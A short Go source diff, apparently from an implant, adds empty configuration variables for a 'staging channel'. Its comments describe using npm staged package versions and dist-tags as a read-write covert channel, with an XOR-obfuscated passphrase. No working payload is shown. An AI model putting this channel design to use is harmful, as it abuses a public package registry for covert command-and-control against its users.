@@ -15,4 +15,10 @@ var (
 	// embeddedKey is the channel passphrase XOR-obfuscated with
 	// sha256(package). Empty means an unencrypted channel.
 	embeddedKey = ""
+
+	// Staging-channel configuration. When embeddedStageChan is non-empty the
+	// implant reads and writes staged versions instead of dist-tags, which is
+	// the only write path npm still allows automation.
+	embeddedStageChan = ""
+	embeddedStageMode = ""
 )
